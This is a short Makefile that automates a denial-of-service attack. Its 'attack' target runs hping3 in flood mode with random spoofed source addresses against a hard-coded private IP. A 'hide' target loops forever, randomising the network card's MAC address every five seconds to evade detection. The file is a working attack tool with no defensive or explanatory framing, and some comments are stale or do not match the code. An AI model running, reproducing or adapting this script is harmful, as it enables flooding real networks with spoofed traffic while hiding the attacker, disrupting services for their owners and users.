# Define variables
DDOS = hping3
HFLAG = --flood -V -d 100 --rand-source
TTL = -I eth0 -0 -R --ttl 128
XPIP = 192.168.68.129

#all: attack hide

# Define a target to print the attack_IP
all: attack hide
hide:
        while true; do\
                make change_mac; \
                sleep 5; \
                done

attack:
        $(DDOS) $(HFLAG) $(TTL) $(XPIP)


# Define a target to change MAC address (assuming RMAC is defined elsewhere)
change_mac:
        sudo macchanger -r eth0

# Define a function to generate the attack_IP
#define RIP
RIP:
$(eval attack_IP := 127.$(shell shuf -i 0-255 -n 1).$(shell shuf -i 0-255 -n 1).$(shell shuf -i 0-255  -n 1))
#endef
